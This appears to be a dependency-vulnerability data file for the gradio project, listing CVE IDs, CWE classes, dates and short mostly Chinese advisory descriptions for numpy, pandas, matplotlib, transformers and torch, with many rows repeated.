gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,>=4.46.0,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,>=4.46.0,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,>=4.46.0,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,>=4.46.0,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,torch,>=2.3.1,True,CVE-2024-5480,CWE-77,2024-06-06,PyTorch 是一个流行的开源深度学习框架，广泛用于研究和生产环境。torch.distributed.rpc框架用于在分布式训练场景中支持RPC操作。在2.2.2版本之前，该框架在RPC操作期间没有正确验证被调用的函数，这导致攻击者可以在多CPU RPC通信过程中，通过内置的Python函数（如eval）执行任意命令。,2,2
gradio-app_gradio,torch,>=2.3.1,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,>=2.3.1,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
